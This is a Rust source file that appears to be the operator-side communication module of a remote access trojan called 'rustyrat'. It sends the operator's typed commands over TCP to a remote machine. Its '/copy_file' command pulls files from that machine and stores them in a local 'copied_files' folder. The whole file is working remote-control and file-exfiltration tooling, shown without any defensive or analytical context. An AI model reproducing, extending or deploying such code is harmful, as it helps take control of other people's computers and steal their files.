use std::net::TcpStream;
use std::io::{Read, Write, BufReader, BufRead};
use std::sync::{Arc, Mutex};
use std::thread;
use std::io;
use std::fs::{self, File};
use std::path::Path;
use std::env;

use crate::libs::debug_info::writeDebugInfo;

fn get_copy_folder() -> std::path::PathBuf {
    // Get the user's Documents folder
    let docs_path = if cfg!(target_os = "windows") {
        env::var("USERPROFILE")
            .map(|p| Path::new(&p).join("Documents"))
            .unwrap_or_else(|_| Path::new(".").to_path_buf())
    } else {
        env::var("HOME")
            .map(|p| Path::new(&p).join("Documents"))
            .unwrap_or_else(|_| Path::new(".").to_path_buf())
    };
    
    // Create the rustyrat/copied_files folder path
    let copy_folder = docs_path.join("rustyrat").join("copied_files");
    
    // Create the folder if it doesn't exist
    if !copy_folder.exists() {
        if let Err(e) = fs::create_dir_all(&copy_folder) {
            eprintln!("❌ Error creating folder: {}", e);
        } else {
            println!("📁 Created folder: {:?}", copy_folder);
        }
    }
    
    copy_folder
}

fn print_progress(current: usize, total: u64) {
    let percent = (current as f64 / total as f64) * 100.0;
    let filled = (percent / 2.0) as usize; // 50 chars width progress bar
    let empty = 50 - filled;
    
    print!("\r📥 Downloading: [{}{}] {:.1}% ({}/{} bytes)",
        "█".repeat(filled),
        "░".repeat(empty),
        percent,
        current,
        total
    );
    io::stdout().flush().unwrap();
}

pub fn start_communication(stream: TcpStream) {
    let stream = Arc::new(Mutex::new(stream));
    let write_stream = Arc::clone(&stream);
    let read_stream = Arc::clone(&stream);
    
    // Track if we're waiting for file bytes
    let waiting_for_file: Arc<Mutex<Option<String>>> = Arc::new(Mutex::new(None));
    let waiting_for_file_read = Arc::clone(&waiting_for_file);
    
    writeDebugInfo("Communication started");
    
    // Reading Handle Thread
    thread::spawn(move || {
        loop {
            let mut stream_guard = read_stream.lock().unwrap();
            
            // Check if we're waiting for file bytes
            let file_info = waiting_for_file_read.lock().unwrap().clone();
            
            if let Some(filename) = file_info {
                // Read file size (8 bytes, u64)
                let mut size_buffer = [0u8; 8];
                if let Err(e) = stream_guard.read_exact(&mut size_buffer) {
                    eprintln!("❌ Error reading file size: {}", e);
                    *waiting_for_file_read.lock().unwrap() = None;
                    continue;
                }
                let file_size = u64::from_be_bytes(size_buffer);
                println!("📥 Starting download: {} bytes", file_size);
                
                // Read file bytes with progress
                let mut file_bytes = Vec::with_capacity(file_size as usize);
                let mut buffer = [0u8; 8192]; // Read in 8KB chunks
                let mut total_read: usize = 0;
                
                while total_read < file_size as usize {
                    let remaining = file_size as usize - total_read;
                    let to_read = std::cmp::min(remaining, buffer.len());
                    
                    match stream_guard.read_exact(&mut buffer[..to_read]) {
                        Ok(_) => {
                            file_bytes.extend_from_slice(&buffer[..to_read]);
                            total_read += to_read;
                            print_progress(total_read, file_size);
                        }
                        Err(e) => {
                            eprintln!("\n❌ Error reading file bytes: {}", e);
                            *waiting_for_file_read.lock().unwrap() = None;
                            break;
                        }
                    }
                }
                
                println!(); // New line after progress bar
                
                if total_read != file_size as usize {
                    *waiting_for_file_read.lock().unwrap() = None;
                    continue;
                }
                
                // Extract filename from path
                let file_name = Path::new(&filename)
                    .file_name()
                    .and_then(|n| n.to_str())
                    .unwrap_or("downloaded_file");
                
                // Get the copy folder and create full path
                let copy_folder = get_copy_folder();
                let full_path = copy_folder.join(file_name);
                
                match File::create(&full_path) {
                    Ok(mut file) => {
                        match file.write_all(&file_bytes) {
                            Ok(_) => {
                                println!("═══════════════════════════════════════════");
                                println!("✅ FILE COPIED SUCCESSFULLY");
                                println!("═══════════════════════════════════════════");
                                println!("📄 File name: {}", file_name);
                                println!("📦 File size: {} bytes", file_size);
                                println!("📁 Saved to:  {:?}", full_path);
                                println!("═══════════════════════════════════════════");
                            }
                            Err(e) => eprintln!("❌ Error writing file: {}", e),
                        }
                    }
                    Err(e) => eprintln!("❌ Error creating file: {}", e),
                }
                
                // Reset waiting state
                *waiting_for_file_read.lock().unwrap() = None;
            } else {
                // Normal text message reading
                drop(stream_guard); // Release lock for non-blocking behavior
                
                let stream_for_read = read_stream.lock().unwrap().try_clone().expect("Clone failed");
                let reader = BufReader::new(stream_for_read);
                
                for line in reader.lines() {
                    match line {
                        Ok(msg) => {
                            if !msg.is_empty() {
                                println!("Received: {}", msg);
                            }
                        }
                        Err(_) => break,
                    }
                }
                break;
            }
        }
    });

    // Writing Handle Thread
    thread::spawn(move || {
        let mut buffer = String::new();
        loop {
            buffer.clear();
            print!("[COM_LIB] Enter message to send: ");
            io::stdout().flush().expect("Error at flushing stdout");
            io::stdin().read_line(&mut buffer).expect("Error at reading from stdin");
            let trimmed = buffer.trim().to_string();
            
            // Check if this is a copy_file command
            if let Some(filepath) = trimmed.strip_prefix("/copy_file ") {
                // Set the waiting state with the filename
                *waiting_for_file.lock().unwrap() = Some(filepath.to_string());
                println!("📤 Requesting file: {}", filepath);
            }
            
            // Send the command
            let mut stream_guard = write_stream.lock().unwrap();
            stream_guard.write_all(trimmed.as_bytes()).expect("Error at writing");
            stream_guard.flush().expect("Error flushing");
        }
    });

    loop {
        thread::park();
    }
}